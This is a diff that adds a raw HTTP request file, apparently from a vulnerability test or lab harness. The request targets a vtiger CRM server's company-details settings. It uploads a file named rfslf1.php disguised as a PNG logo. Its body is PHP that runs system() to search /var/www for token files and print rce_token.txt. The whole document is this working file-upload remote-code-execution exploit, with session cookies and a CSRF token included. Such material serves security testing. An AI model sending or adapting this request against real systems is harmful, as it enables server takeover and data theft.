@@ -1,0 +1,78 @@
+POST http://192.168.101.10:88/index.php HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://192.168.101.10:88/index.php?module=Vtiger&parent=Settings&view=CompanyDetails&block=3&fieldid=14
+Cookie: kittycatfish_count=16%3A11; PHPSESSID=7c156c0c06bd17f12714475615b28fe9; wordpress_test_cookie=WP+Cookie+check; roundcube_sessid=0b316b9kmdpl3bvnroih7rf3u2
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------85340952137269376758954087
+Content-Length: 2996
+Host: 192.168.101.10:88
+
+-----------------------------85340952137269376758954087
+Content-Disposition: form-data; name="__vtrftk"
+
+sid:00dcdd6c3aa2a1a921d296ba29be174610dbfeee,1499414457
+-----------------------------85340952137269376758954087
+Content-Disposition: form-data; name="module"
+
+Vtiger
+-----------------------------85340952137269376758954087
+Content-Disposition: form-data; name="parent"
+
+Settings
+-----------------------------85340952137269376758954087
+Content-Disposition: form-data; name="action"
+
+CompanyDetailsSave
+-----------------------------85340952137269376758954087
+Content-Disposition: form-data; name="logo"; filename="rfslf1.php"
+Content-Type: image/png
+
+<? system('find /var/www/ -name "*token*"'); system('cat /var/www/rce_token.txt'); ?>
+-----------------------------85340952137269376758954087
+Content-Disposition: form-data; name="organizationname"
+
+vtiger
+-----------------------------85340952137269376758954087
+Content-Disposition: form-data; name="address"
+
+95, 12th Main Road, 3rd Block, Rajajinagar
+-----------------------------85340952137269376758954087
+Content-Disposition: form-data; name="city"
+
+Bangalore
+-----------------------------85340952137269376758954087
+Content-Disposition: form-data; name="state"
+
+Karnataka
+-----------------------------85340952137269376758954087
+Content-Disposition: form-data; name="code"
+
+560010
+-----------------------------85340952137269376758954087
+Content-Disposition: form-data; name="country"
+
+India
+-----------------------------85340952137269376758954087
+Content-Disposition: form-data; name="phone"
+
++91 9243602352
+-----------------------------85340952137269376758954087
+Content-Disposition: form-data; name="fax"
+
++91 9243602352
+-----------------------------85340952137269376758954087
+Content-Disposition: form-data; name="website"
+
+www.vtiger.com
+-----------------------------85340952137269376758954087
+Content-Disposition: form-data; name="vatid"
+
+1234-5678-9012
+-----------------------------85340952137269376758954087
+Content-Disposition: form-data; name="saveButton"
+
+
+-----------------------------85340952137269376758954087--
+
